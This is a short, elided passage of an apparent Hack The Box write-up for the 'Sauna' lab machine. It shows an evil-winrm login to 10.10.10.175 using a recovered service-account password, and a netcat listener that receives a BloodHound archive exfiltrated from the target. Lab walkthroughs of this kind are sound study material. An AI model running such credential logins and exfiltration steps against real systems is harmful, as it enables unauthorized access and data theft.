...
4.2- [New Account Enumeration](https://github.com/flast101/HTB-writeups/tree/master/sauna#42--new-account-enumeration)  
4.3- [Post-Compromise Exploitation](https://github.com/flast101/HTB-writeups/tree/master/sauna#43--post-compromise-exploitation)
...
It does not work with the account “svc_loanmanager” :
...
But we noticed in win PEAS results that its home directory is named "svc_loanmgr" :
root@kali:~# evil-winrm -i 10.10.10.175 -u svc_loanmgr -p Moneymakestheworldgoround!
Evil-WinRM shell v2.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents>

it works ! We have a valid creds :
...
root@kali:~/Documents/results/10.10.10.175# nc -nlvp 4444 > bloohound.zip
